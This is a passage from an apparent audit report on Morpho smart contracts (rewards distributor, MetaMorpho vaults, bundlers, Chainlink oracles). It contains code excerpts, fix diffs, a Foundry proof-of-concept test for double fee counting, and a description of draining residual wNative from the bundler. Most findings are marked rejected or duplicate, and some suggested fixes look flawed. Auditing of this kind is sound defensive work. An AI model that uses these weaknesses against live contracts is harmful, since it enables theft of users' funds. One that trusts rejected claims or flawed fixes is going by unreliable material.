  1.  if the new distribution has a claimable amount less than or equals to the previous distribution; then `claim` function will revert with `CLAIMABLE_TOO_LOW` error because the same account has claimed the previous distribution and his `claimed[account][reward]` is set to the previous claimable amount which is >= new claimable amount:

  ```solidity
    require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);
  ```

  2.  if the new distribution has a claimable amount greater than the previous distribution; then the user will get rewards amount equals to the difference between the new claimable and old claimable amounts:

  ```solidity
    amount = claimable - claimed[account][reward];

    claimed[account][reward] = claimable;

    ERC20(reward).safeTransfer(account, amount);
  ```

  So users can only claim the reward difference later but not the full reward amount if the URD contract owner distributes the same reward token twice.

- Proof of Concept

[UniversalRewardsDistributor.claim function](https://github.com/morpho-org/universal-rewards-distributor/blob/94a604c926a4878661f38a8f3b05cd61c95c7b84/src/UniversalRewardsDistributor.sol#L115C1-L136C6)

```solidity
    function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)
        external
        returns (uint256 amount)
    {
        require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);
        require(
            MerkleProof.verifyCalldata(
                proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
            ),
            ErrorsLib.INVALID_PROOF_OR_EXPIRED
        );

        require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);

        amount = claimable - claimed[account][reward];

        claimed[account][reward] = claimable;

        ERC20(reward).safeTransfer(account, amount);

        emit EventsLib.Claimed(account, reward, amount);
    }
```

- Tools Used

Manual Review.

- Recommendation

An easy mitigation could be using a flag for each reward distribution, and this flag is set to true when the user claims his rewards from this distribution:

```diff
+   mapping(address account => mapping(uint256 rewardDistributionId => bool isDistributed)) public isClaimed;

+  uint256 distributionId;
```

```diff
    function _setRoot(bytes32 newRoot, bytes32 newIpfsHash) internal {
        root = newRoot;
        ipfsHash = newIpfsHash;

        delete pendingRoot;

+       distributionId++;

        emit EventsLib.RootSet(newRoot, newIpfsHash);
    }
```

```diff
    function claim(address account, address reward, uint256 claimable, bytes32[] calldata proof)
        external
        returns (uint256 amount)
    {
        require(root != bytes32(0), ErrorsLib.ROOT_NOT_SET);
        require(
            MerkleProof.verifyCalldata(
                proof, root, keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))
            ),
            ErrorsLib.INVALID_PROOF_OR_EXPIRED
        );

-       require(claimable > claimed[account][reward], ErrorsLib.CLAIMABLE_TOO_LOW);

-       amount = claimable - claimed[account][reward];

-       claimed[account][reward] = claimable;

-       ERC20(reward).safeTransfer(account, amount);

-       emit EventsLib.Claimed(account, reward, amount);

+       require(!isClaimed[account][distributionId], ErrorsLib.CLAIMABLE_TOO_LOW);

+       isClaimed[account][distributionId]=true;

+       ERC20(reward).safeTransfer(account, claimable);

+       emit EventsLib.Claimed(account, reward, claimable);
    }
```



### `MetaMorpho.updateWithdrawQueue` function: removed market can be present in the deposit markets (`supplyQueue`)	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- `MetaMorpho.updateWithdrawQueue` function enables the allocator to remove any market from the
  `withdrawQueue` if it has been flagged to be removed by the curator by setting its `config[id].removableAt = uint64(block.timestamp + timelock)` (via calling `submitMarketRemoval` function).

- By removing a market from `withdrawQueue`; depositors can't withdraw their supplied asset from this market, but depositors can still deposit their assets to the same market that has been removed because the same market hasn't been removed from the `supplyQueue` array as well.

- Note: the assumption that the market is present in both `withdrawQueue` and `supplyQueue` arises from the fact that when a market is added to the vault(by setting it's cap to a value > 0) it's pushed to the `withdrawQueue` and `supplyQueue` arrays:

  ```solidity
  if (!marketConfig.enabled) {
                  supplyQueue.push(id);
                  withdrawQueue.push(id);

                  if (
                      supplyQueue.length > ConstantsLib.MAX_QUEUE_LENGTH ||
                      withdrawQueue.length > ConstantsLib.MAX_QUEUE_LENGTH
                  ) {
                      revert ErrorsLib.MaxQueueLengthExceeded();
                  }

                  marketConfig.enabled = true;
              }
  ```

- Impact

So depositors will still be able to deposit in the market that has been removed from the `withdrawQueue`, and they will not be able to withdraw from the same mmarket unless the allocatore reallocates the vault's liquidity.

- Proof of Concept

[MetaMorpho.updateWithdrawQueue function](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L346C4-L385C6)

```solidity
 function updateWithdrawQueue(uint256[] calldata indexes) external onlyAllocatorRole {
        uint256 newLength = indexes.length;
        uint256 currLength = withdrawQueue.length;

        bool[] memory seen = new bool[](currLength);
        Id[] memory newWithdrawQueue = new Id[](newLength);

        for (uint256 i; i < newLength; ++i) {
            uint256 prevIndex = indexes[i];

            // If prevIndex >= currLength, it will revert with native "Index out of bounds".
            Id id = withdrawQueue[prevIndex];
            if (seen[prevIndex]) revert ErrorsLib.DuplicateMarket(id);
            seen[prevIndex] = true;

            newWithdrawQueue[i] = id;
        }

        for (uint256 i; i < currLength; ++i) {
            if (!seen[i]) {
                Id id = withdrawQueue[i];

                if (config[id].cap != 0) revert ErrorsLib.InvalidMarketRemovalNonZeroCap(id);

                if (MORPHO.supplyShares(id, address(this)) != 0) {
                    if (config[id].removableAt == 0) revert ErrorsLib.InvalidMarketRemovalNonZeroSupply(id);

                    if (block.timestamp < config[id].removableAt) {
                        revert ErrorsLib.InvalidMarketRemovalTimelockNotElapsed(id);
                    }
                }

                delete config[id];
            }
        }

        withdrawQueue = newWithdrawQueue;

        emit EventsLib.SetWithdrawQueue(_msgSender(), newWithdrawQueue);
    }
```

- Tools Used

Manual Review.

- Recommendation

Ensure that if a market is removed from `withdrawQueue` then it will be removed from the `supplyQueue` as well.




### `MetaMorpho.reallocate` function can allocate liquidity to `MORPHO` markets that almost reached its capacity	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- `MetaMorpho.reallocate` function is designed to enable vault allocator to reallocat the vault's liquidity so as to reach a given allocation of assets on each given market; and any additional liquidity withdrawn during reallocation will be kept idle.

- And it was stated by the documentation that idle supply should be provided for specific markets that doesn't allow borrow, in order to retain the vault's funds, as per the [documentation](https://github.com/morpho-org/metamorpho/blob/main/README.md#:~:text=of%20any%20market.-,Idle%20Supply,and%20are%20guaranteed%20to%20be%20liquid%3B%20though%20it%20won%27t%20generate%20interest.,-Note%20that%20to) below:

  > Idle Supply
  > In some cases, the vault's curator or allocators may want to keep some funds "idle", to guarantee lenders that some liquidity can be withdrawn from the vault (beyond the liquidity of each of the vault's markets).
  > To achieve this, it is advised to allocate "idle" funds to any market on Morpho Blue having:
  > The vault's asset as loan token.
  > No collateral token (address(0)).
  > An arbitrary IRM.
  > An arbitrary oracle (address(0)).
  > An arbitrary LLTV.
  > Thus, these funds cannot be borrowed on Morpho Blue and are guaranteed to be liquid; though
  > it won't generate interest.

- But it was noted that assets withdrawn when reallocating are supplied to any market without checking if these markets enabled borrow or not (as per the stated cases above).

- Impact

So this might result in these idle supplied assets being stuck if they were supplied to markets that will later have its totalBorrowAssets reacheed its totalSupplyAssets; then the supplied idle liquidity can't be withdrawn from these market (nor allocated as well):

[here:](https://github.com/morpho-org/morpho-blue/blob/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L220C9-L220C113)

```solidity
require(market[id].totalBorrowAssets <= market[id].totalSupplyAssets, ErrorsLib.INSUFFICIENT_LIQUIDITY);
```

- Proof of Concept

[MetaMorpho.reallocate function](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L387C5-L446C6)

```solidity
/// @notice Reallocates the vault's liquidity so as to reach a given allocation of assets on each given market.
    /// @notice The allocator can withdraw from any market, even if it's not in the withdraw queue, as long as the loan
    /// token of the market is the same as the vault's asset.
    /// @dev The behavior of the reallocation can be altered by state changes, including:
    /// - Deposits on the vault that supplies to markets that are expected to be supplied to during reallocation.
    /// - Withdrawals from the vault that withdraws from markets that are expected to be withdrawn from during
    /// reallocation.
    /// - Donations to the vault on markets that are expected to be supplied to during reallocation.
    /// - Withdrawals from markets that are expected to be withdrawn from during reallocation.
    /// @dev Any additional liquidity withdrawn during reallocation will be kept idle.
    function reallocate(MarketAllocation[] calldata allocations) external onlyAllocatorRole {
        uint256 totalSupplied;
        uint256 totalWithdrawn;
        for (uint256 i; i < allocations.length; ++i) {
            MarketAllocation memory allocation = allocations[i];
            Id id = allocation.marketParams.id();

            (uint256 supplyAssets, uint256 supplyShares,) = _accruedSupplyBalance(allocation.marketParams, id);
            uint256 withdrawn = supplyAssets.zeroFloorSub(allocation.assets);

            if (withdrawn > 0) {
                if (allocation.marketParams.loanToken != asset()) revert ErrorsLib.InconsistentAsset(id);

                // Guarantees that unknown frontrunning donations can be withdrawn, in order to disable a market.
                uint256 shares;
                if (allocation.assets == 0) {
                    shares = supplyShares;
                    withdrawn = 0;
                }

                (uint256 withdrawnAssets, uint256 withdrawnShares) =
                    MORPHO.withdraw(allocation.marketParams, withdrawn, shares, address(this), address(this));

                emit EventsLib.ReallocateWithdraw(_msgSender(), id, withdrawnAssets, withdrawnShares);

                totalWithdrawn += withdrawnAssets;
            } else {
                uint256 suppliedAssets = allocation.assets == type(uint256).max
                    ? totalWithdrawn.zeroFloorSub(totalSupplied)
                    : allocation.assets.zeroFloorSub(supplyAssets);

                if (suppliedAssets == 0) continue;

                uint256 supplyCap = config[id].cap;
                if (supplyCap == 0) revert ErrorsLib.UnauthorizedMarket(id);

                if (supplyAssets + suppliedAssets > supplyCap) revert ErrorsLib.SupplyCapExceeded(id);

                // The market's loan asset is guaranteed to be the vault's asset because it has a non-zero supply cap.
                (, uint256 suppliedShares) =
                    MORPHO.supply(allocation.marketParams, suppliedAssets, 0, address(this), hex"");

                emit EventsLib.ReallocateSupply(_msgSender(), id, suppliedAssets, suppliedShares);

                totalSupplied += suppliedAssets;
            }
        }

        if (totalWithdrawn != totalSupplied) revert ErrorsLib.InconsistentReallocation();
    }
```

- Tools Used

Manual Review.

- Recommendation

Check if morpho markets satisfy the documented conditions (markets that don't allow borrow) before supplying the idle supply to it via `reallocate` function.



### `MetaMorpho` vaults can be blocked if all the `withdrawQueue` markets reach capacity	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- `withdrawQueue` array has all the markets that depositors can withdraw their provided liquidity from.

- So when a depositor calls `MetaMorpho.withdraw` function; `_withdrawMorpho` is invoked where it loops over markets to withdraw the required asset amount, and stops once the total amount of the `assets` has been withdrawn.

- But this function will revert if the available liquidity in the markets of `withdrawQueue` array is not enough to satisfy the withdrawal operation:

  ```solidity
      /// @dev Withdraws `assets` from Morpho.
      function _withdrawMorpho(uint256 assets) internal {
  //some code..
          if (assets != 0) revert ErrorsLib.NotEnoughLiquidity();
      }
  ```

- This case happens when each market (or most of the markets, where their total available liquidity can't satisfy the withdrawal operation) set in the `withdrawQueue` array has reached [the following state](https://github.com/morpho-org/morpho-blue/blob/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L220C9-L220C113) which is chcked in the `MORPHO.withdraw` function:

  ```solidity
  require(market[id].totalBorrowAssets <= market[id].totalSupplyAssets, ErrorsLib.INSUFFICIENT_LIQUIDITY);
  ```

  when the totalBorrowAssets of a market reaches its totalSupplyAssets; then no more liquidity can be withdrawn from the market.

- Impact

If this state is reached for every market in the `withdrawQueue`; then depositors can't withdraw their provided liquidity and vault allocator can't reallocate vault's liquidity since the withdrawal from these morpho markets will revert; so the vault will be in a blocked/stuck state for withdrawals.

- Proof of Concept

[MetaMorpho.\_withdrawMorpho function](https://github.com/morpho-org/metamorpho/blob/f4e2574029743088a8800149593fa997ab66f0f8/src/MetaMorpho.sol#L822C1-L844C6)

```solidity
    /// @dev Withdraws `assets` from Morpho.
    function _withdrawMorpho(uint256 assets) internal {
        for (uint256 i; i < withdrawQueue.length; ++i) {
            Id id = withdrawQueue[i];
            MarketParams memory marketParams = _marketParams(id);
            (uint256 supplyAssets,, Market memory market) = _accruedSupplyBalance(marketParams, id);

            uint256 toWithdraw = UtilsLib.min(
                _withdrawable(marketParams, market.totalSupplyAssets, market.totalBorrowAssets, supplyAssets), assets
            );

            if (toWithdraw > 0) {
                // Using try/catch to skip markets that revert.
                try MORPHO.withdraw(marketParams, toWithdraw, 0, address(this), address(this)) {
                    assets -= toWithdraw;
                } catch {}
            }

            if (assets == 0) return;
        }

        if (assets != 0) revert ErrorsLib.NotEnoughLiquidity();
    }
```

- Tools Used

Manual Review.

- Recommendation

Can't think of an appropriate mitigation as this case is out of the protocol and vaults control.



### `WNativeBundler.wrapNative` & `WNativeBundler.unwrapNative` functions lack slippage protection mechanism	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- `WNativeBundler` contract is intended to manage interactions with network's wrapped native token; where "wrapped native" refers to forks of WETH.

- `WNativeBundler.wrapNative` function is intended to wrap the given `amount` of the native token to wNative, where initiator must have previously transferred their native tokens to the bundler, and the transferred native tokens value must be equal to the `amount` argument, then the function calls `IWNative(WRAPPED_NATIVE).deposit{value: amount}()` for the operation.

- But it was noticed that there's no mechanism to check whether the received wrapped tokens are sufficient or not as the function doesn't implemnt any mechanism to protect against slippage.

- The same issue is spotted in `WNativeBundler.unwrapNative` function; where the user transfers their wrapped tokens to the bundler which will in turn calls `IWNative(WRAPPED_NATIVE).withdraw(amount)` to unwarp it and sends an equivalent amount to the bundler; but there's no implemented mechanism to check against slippage as the user might receive native tokens amount less than intended.

- Impact

Users might receive inadequate amounts of native/wrapped tokens lesser than they wish.

- Proof of Concept

[WNativeBundler.wrapNative function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L47C2-L53C6)

```solidity
   function wrapNative(uint256 amount) external payable protected {
        amount = Math.min(amount, address(this).balance);

        require(amount != 0, ErrorsLib.ZERO_AMOUNT);

        IWNative(WRAPPED_NATIVE).deposit{value: amount}();
    }
```

[WNativeBundler.unwrapNative function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L59C1-L65C6)

```solidity
    function unwrapNative(uint256 amount) external payable protected {
        amount = Math.min(amount, ERC20(WRAPPED_NATIVE).balanceOf(address(this)));


        require(amount != 0, ErrorsLib.ZERO_AMOUNT);


        IWNative(WRAPPED_NATIVE).withdraw(amount);
    }
```

- Tools Used

Manual Review.

- Recommendation

Since the behavior of the wrapped native contract is not known (might differ from the current wETH contract for example) so it's better to add a mechanism to check slippage manually by cashing the balance of the bundler before and after the operation and check the balance difference against a predefined minimum acceptanble value defined by the user (slippage check).



### `WNativeBundler.unwrapNative` function doesn't transfer the unwrapped native tokens back to the user if not utilized 	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- `WNativeBundler` contract is intended to manage interactions with network's wrapped native token; where "wrapped native" refers to forks of WETH.

- `WNativeBundler.unwrapNative` function is intended to unwrap wNative to the native token, where the user transfers their wrapped tokens to the bundler which will in turn calls `IWNative(WRAPPED_NATIVE).withdraw(amount)` to unwarp it and **sends an equivalent amount to the WNativeBundler contract**.

- It's intended by design to not send the unwrapped native tokens to the user after unwrapping them in the assumption that these native tokens will be utilized by the user in the next calls of the multicall; but these tokens might not be fully consumed/utilized by the user; then the residual will not be sent back to the user and will be locked in the contract (or used by next callers).

- Impact

Users will not receive back their residual/excessive native tokens.

- Proof of Concept

[WNativeBundler.unwrapNative function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L59C1-L65C6)

```solidity
    function unwrapNative(uint256 amount) external payable protected {
        amount = Math.min(amount, ERC20(WRAPPED_NATIVE).balanceOf(address(this)));


        require(amount != 0, ErrorsLib.ZERO_AMOUNT);


        IWNative(WRAPPED_NATIVE).withdraw(amount);
    }
```

- Tools Used

Manual Review.

- Recommendation

Refund the caller the residual native tokens (if any left) after the multicall is done.



### `BaseBundler` contract lacks a mechanism to refund remaining native ETH to the caller	_(duplicate of [Bundler doesn't return exces funds in its balance in the end and the reaminging funds in the Bundler will be lost])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- `BaseBundler` contract enables users from calling multiple functions in a single call to the same contract (self), and these calls can be payable where the user sends native tokens when calling `multicall` function to execute payable calls (calls might be wrapping native tokens or transferring native tokens).

- But it was noticed that some bundler contracts have functions that are intended to send native tokens to recipients, and these functions use `amount` sent as a function argument instead of `msg.value`; and this is justfied by the protocol as the `msg.value` sent with `BaseBundler.multicall` is intended to be consumed in multiple calls so that the `amount` is not checked if it equals to the `msg.value`; such as [TransferBundler.nativeTransfer function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/TransferBundler.sol#L26C1-L35C6):

```solidity
    function nativeTransfer(address recipient, uint256 amount) external payable protected {
        require(recipient != address(0), ErrorsLib.ZERO_ADDRESS);
        require(recipient != address(this), ErrorsLib.BUNDLER_ADDRESS);

        amount = Math.min(amount, address(this).balance);

        if (amount == 0) return;

        SafeTransferLib.safeTransferETH(recipient, amount);
    }
```

- Impact

- There seems to be issues with this design choice:

  1. What if the user interacts with one function that is payable? then the `amount` must be == `msg.value`.
  2. Also users might call bundlers functions that don't require any `msg.value` but are marked as `payable`, and users might by mistake send native tokens; so they must be refunded the excess of `msg.value`.
  3. Or the user can call unwrapNative function in `WNativeBundler` contract and then not using the full amount of the unwrapped ethers in the next calls, and he will not be refunded the remaining amount.

- Proof of Concept

[BaseBundler.\_multicall function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/BaseBundler.sol#L65C1-L72C6)

```solidity
    function _multicall(bytes[] memory data) internal {
        for (uint256 i; i < data.length; ++i) {
            (bool success, bytes memory returnData) = address(this).delegatecall(data[i]);

            // No need to check that `address(this)` has code in case of success.
            if (!success) _revert(returnData);
        }
    }
```

- Tools Used

Manual Review.

- Recommendation

- Check if there are any residual native tokens locked after the `multicall`, how this can be done?
  assuming that bundler contracts **are not supposed to hold any funds**, then store the balance of the bundler before call - after the multicall ; then the difference is refunded to the user.

- This suggestion might not work with bundlers that withdraws native tokens/unwraps native tokens as the balance of the bundler after the multicall is greater; so refund the user with the balance difference between contract balance after the multicall - contract balance before multical:

```diff
    function _multicall(bytes[] memory data) internal {
+       uint256 balanceBefore = address(this).balance;
        for (uint256 i; i < data.length; ++i) {
            (bool success, bytes memory returnData) = address(this).delegatecall(data[i]);

            // No need to check that `address(this)` has code in case of success.
            if (!success) _revert(returnData);
        }
+       uint256 balanceAfter = address(this).balance;
+       if(balanceAfter > balanceBefore ){
+          SafeTransferLib.safeTransferETH(_initiator , balanceAfter - balanceBefore);
+       }else if(balanceBefore > balanceAfter){
+          SafeTransferLib.safeTransferETH(_initiator , balanceBefore - balanceAfter);
+       }
    }
```




###  `WNativeBundler.unwrapNative` function can be exploited by a malicious actor	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Details

- `WNativeBundler` contract is intended to manage interactions with network's wrapped native token; where "wrapped native" refers to forks of WETH.

- `WNativeBundler.unwrapNative` function is intended to unwrap wNative to the native token, where the user transfers his wrapped tokens to the bundler which will in turn calls `IWNative(WRAPPED_NATIVE).withdraw(amount)` to unwarp it and **sends an equivalent amount to the WNativeBundler contract**.

- But if the bundler balance of the unwrapped native token is > the amount sent by the user (residual balance from previous users if they haven't withdrawn their full amount of the unwrapped native tokens) ; then any malicious user can withdraw the full wNative balance of the contract by setting the `amount` argument to a value greater than the bundler contract balance of the wNative tokens.

- Impact

Bundler contract balance of wNative tokens will be drained (if it holds any residual from previous users multicalls).

- Proof of Concept

[WNativeBundler.unwrapNative function](https://github.com/morpho-org/morpho-blue-bundlers/blob/5099e5fef9a82a500b875eb81b90c2deca1de243/src/WNativeBundler.sol#L59C1-L65C6)

```solidity
    function unwrapNative(uint256 amount) external payable protected {
        amount = Math.min(amount, ERC20(WRAPPED_NATIVE).balanceOf(address(this)));


        require(amount != 0, ErrorsLib.ZERO_AMOUNT);


        IWNative(WRAPPED_NATIVE).withdraw(amount);
    }
```

- Tools Used

Manual Review.

- Recommendation

Ensure that there's no residual tokens left in the contract balance after the users calls (refund excess).




### chainlink oracle price can become stale	_(duplicate of [Don't check chainlink's latestRoundData return stale or incorrect result])_

**Severity:** Medium risk

**Context:** [ChainlinkDataFeedLib.sol#L23-L23](morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol#L23-L23)

**Description**:

```solidity
        (, int256 answer,,,) = feed.latestRoundData();
```

chainlink price can become stale and the code does not validate the oracle updated timestamp

the likelihood is medium but the impact is high because in case when the stale price is consumed

it leads to false liquidation / over borrow 




**Recommendation**:

validate timestamp of the oracle and if the oracle become stales, revert oracle

```solidity
(, int256 price, , uint256 updatedAt, ) = priceFeedDAIETH.latestRoundData();

if (updatedAt < block.timestamp - 60 * 60 /* 1 hour */) {
   revert("stale price feed");
}
```




### Edge case for double fee accounting	_(duplicate of [User will be paying duplicate fees])_

**Severity:** Medium risk

**Context:** [MetaMorpho.sol#L364-L380](metamorpho/src/MetaMorpho.sol#L364-L380)

**Description:** The fees are calculated based on the variance of total assets held by MetaMorpho, to calculate the total assets MetaMorpho contracts get the expected assets in the `withdrawQueue` list.
The issue of double fee counting arises when a market is about to be removed and it still has a supply. Consider all fees for this market are already calculated. After removing the market from the `withdrawQueue`, the total assets held by MetaMorpho change. The fees are then accrued based on the reduced value of total assets.
If this market is subsequently re-added, the total assets increase and fees are calculated based on the new total assets. As these fees were already added in the beginning, they are double-counted. 
The users impacted by these changes are those who don't make any interaction; they will see a reduction in the value of their shares.

**POC:** The following steps can reproduce the issue:
1. Have a market with supply and already accrued fees.
2. Remove the market from the withdrawal queue, but the market still has supply.
3. Accrue the fees, which updates the total assets of the MetaMorpho contract.
4. Re-add the market.
5. Accruing the fees will result in the double counting of the previously added value.

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {IERC20Errors} from "../../lib/openzeppelin-contracts/contracts/interfaces/draft-IERC6093.sol";
import {UtilsLib} from "../../lib/morpho-blue/src/libraries/UtilsLib.sol";
import {SafeCast} from "../../lib/openzeppelin-contracts/contracts/utils/math/SafeCast.sol";
import {SharesMathLib} from "../../lib/morpho-blue/src/libraries/SharesMathLib.sol";

import "./helpers/IntegrationTest.sol";

contract ERC4626HackTest is IntegrationTest {
  using Math for uint256;
  using UtilsLib for uint256;
  using SafeCast for uint256;
  using SharesMathLib for uint256;
  using MorphoBalancesLib for IMorpho;
  using MorphoLib for IMorpho;
  using MarketParamsLib for MarketParams;
  using MathLib for uint256;
  using MarketParamsLib for MarketParams;

  uint256 constant FEE = 0.2 ether;

  function setUp() public override {
    super.setUp();

    _setFee(FEE);

     for (uint256 i; i < NB_MARKETS; ++i) {
        MarketParams memory marketParams = allMarkets[i];

        // Create some debt on the market to accrue interest.

        loanToken.setBalance(SUPPLIER, MAX_TEST_ASSETS);

        vm.prank(SUPPLIER);
        morpho.supply(marketParams, MAX_TEST_ASSETS, 0, ONBEHALF, hex"");

        uint256 collateral = uint256(MAX_TEST_ASSETS).wDivUp(marketParams.lltv);
        collateralToken.setBalance(BORROWER, collateral);

        vm.startPrank(BORROWER);
        morpho.supplyCollateral(marketParams, collateral, BORROWER, hex"");
        morpho.borrow(marketParams, MAX_TEST_ASSETS, 0, BORROWER, BORROWER);
        vm.stopPrank();
    }

    _setCap(allMarkets[0], CAP);
    _sortSupplyQueueIdleLast();
  }

  function testDoubleCountingFee(uint256 deposited, uint256 blocks) public {
    deposited = bound(deposited, MIN_TEST_ASSETS, MAX_TEST_ASSETS);
    blocks = _boundBlocks(blocks);

    loanToken.setBalance(SUPPLIER, deposited);

    vm.prank(SUPPLIER);
    vault.deposit(deposited, SUPPLIER);

    _forward(blocks);

    (uint256 feeShares, uint256 feeAssets) = _feeShares();
    vm.assume(feeShares != 0);
    vm.assume(feeAssets != 0);

    //@audit Make a deposit of 0 to only accrue fees
    vault.deposit(0, SUPPLIER);

    //@audit the fee recipent got fee shares
    assertEq(vault.balanceOf(FEE_RECIPIENT), feeShares, "vault.balanceOf(FEE_RECIPIENT)");
    
    //@audit [market[0], idle]
    assertEq(vault.supplyQueueLength(), 2);
    
    //@audit Create a market removal of market[0]
    Id id = allMarkets[0].id();
    vm.prank(CURATOR);
    vault.submitMarketRemoval(id);

    //@audit warp in time to update the withdraw queue
    vm.warp(block.timestamp + vault.timelock());

    //@audit Remove market from withdraw queue
    uint256[] memory withdrawQueue = new uint[](1);
    withdrawQueue[0] = 0;

    //@audit this implies that the market has supply
    require(morpho.supplyShares(id, address(vault)) > 0, "Invalid market supply");

    //@audit remove market from withdraw queue
    vm.prank(ALLOCATOR);
    vault.updateWithdrawQueue(withdrawQueue);

    //@audit Accrue fees, this will update the total assets
    vault.deposit(0, ONBEHALF);

    //@audit the fee recipent keeps the same shares
    assertEq(vault.balanceOf(FEE_RECIPIENT), feeShares, "vault.balanceOf(FEE_RECIPIENT)");

    //@audit Re-add the market, increasing the total assets
    _setCap(allMarkets[0], CAP); 

    //@audit Accrue fees, this will add fees because the total assets increased, double counting it
    vault.deposit(0, ONBEHALF);
    
    //@audit The fees are counted again, so the fee recipient has now more shares
    assertGt(vault.balanceOf(FEE_RECIPIENT), feeShares, "vault.balanceOf(FEE_RECIPIENT)");
  }

  /****Helper Functions*****/
  
  function _feeShares() internal view returns (uint256 feeShares, uint256 feeAssets) {
    uint256 totalAssetsAfter = vault.totalAssets();
    uint256 interest = totalAssetsAfter - vault.lastTotalAssets();
    feeAssets = interest.mulDiv(FEE, WAD);

    feeShares = feeAssets.mulDiv(
        vault.totalSupply() + 10 ** ConstantsLib.DECIMALS_OFFSET,
        totalAssetsAfter - feeAssets + 1,
        Math.Rounding.Floor
    );
  }

  
  function _accruedFeeShares(uint256 newTotalAssets, uint256 totalSupply) internal view returns (uint256 feeAssets, uint256 feeShares, uint256 assets) {
    uint256 lastTotalAssets = 0;

    uint256 totalInterest = newTotalAssets.zeroFloorSub(lastTotalAssets);
    uint256 fee = 0.05e18; //5% 
    feeAssets = totalInterest.mulDiv(fee, WAD);
    // The fee assets is subtracted from the total assets in this calculation to compensate for the fact
    // that total assets is already increased by the total interest (including the fee assets).
    feeShares =
        _convertToSharesWithTotals(feeAssets, totalSupply, newTotalAssets - feeAssets, Math.Rounding.Floor);

    assets = _convertToAssetsWithTotals(feeShares, totalSupply, newTotalAssets, Math.Rounding.Floor);
  }

  function _convertToSharesWithTotals(
      uint256 assets,
      uint256 newTotalSupply,
      uint256 newTotalAssets,
      Math.Rounding rounding
  ) internal pure returns (uint256) {
    return assets.mulDiv(newTotalSupply + 10 ** 6, newTotalAssets + 1, rounding);
  }

  function _convertToAssetsWithTotals(
      uint256 shares,
      uint256 newTotalSupply,
      uint256 newTotalAssets,
      Math.Rounding rounding
  ) internal pure returns (uint256) {
    return shares.mulDiv(newTotalAssets + 1, newTotalSupply + 10 ** 6, rounding);
  }

}
```

**Recommendation:** The recommendation is to remove or reallocate any remaining supply in a removed market. And users should be made aware that if a market with a supply is removed, their shares could be affected.



### Borrow / withdrawCollateral / liquidation in lending market morpho blue will revert and lock fund if the oracle is deprecated	_(duplicate of [Decommissioned Oracle Feeds can cause denial of service])_

**Severity:** Medium risk

**Context:** [ChainlinkOracle.sol#L119-L119](morpho-blue-oracles/src/ChainlinkOracle.sol#L119-L119)

**Description**:

under the hood,

the function getPrice calls 

```solidity
(, int256 price, , , ) = oracle.latestRoundData();
```

https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles/ mentions, it is possible that Chainlink’s “multisigs can immediately block access to price feeds at will”.

or in case when the oracle is deprecated, 

the oracle query will revert

https://docs.chain.link/data-feeds/deprecating-feeds?network=deprecated&page=1

> Data Feeds with low or no usage or feeds that do not have a viable path to economic sustainability may be scheduled for deprecation.

and chainlink deprecates feeds on weekly / monthly basis so it is not rare event

the price query is used when checking if the account is [healthy in morpho blue](https://github.com/morpho-org/morpho-blue/blob/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L504)

```solidity
    function _isHealthy(MarketParams memory marketParams, Id id, address borrower) internal view returns (bool) {
        if (position[id][borrower].borrowShares == 0) return true;

        uint256 collateralPrice = IOracle(marketParams.oracle).price();

        return _isHealthy(marketParams, id, borrower, collateralPrice);
    }
```

and when liquidation happens

```solidity

        uint256 collateralPrice = IOracle(marketParams.oracle).price();

        require(!_isHealthy(marketParams, id, borrower, collateralPrice), ErrorsLib.HEALTHY_POSITION);

        uint256 repaidAssets;
        {
            // The liquidation incentive factor is min(maxLiquidationIncentiveFactor, 1/(1 - cursor*(1 - lltv))).
```

so borrow / [withdraw collateral](https://github.com/morpho-org/morpho-blue/blob/f463e40f776acd0f26d0d380b51cfd02949c8c23/src/Morpho.sol#L334) / liquidation revert if underlying oracle deprecates

in the lending contract

the oracle address is part of the struct

```solidity
struct MarketParams {
    address loanToken;
    address collateralToken;
    address oracle;
    address irm;
    uint256 lltv;
}
```

and the lending market derives from the market params, so once the oracle address is set, no one can change oracle address


**Recommendation**:

In ChainlinkOracle, use try catch to handle the chainlink oracle revert gracefully

adding a function in ChainlinkOracle to update oracle address



### Assets can be lost when repaying shares in the Morpho Blue markets through the MorphoBundler.	_(duplicate of [Reward's distribution design can cause claimers to lose monetary value because restrictions to claim rewards])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Impact
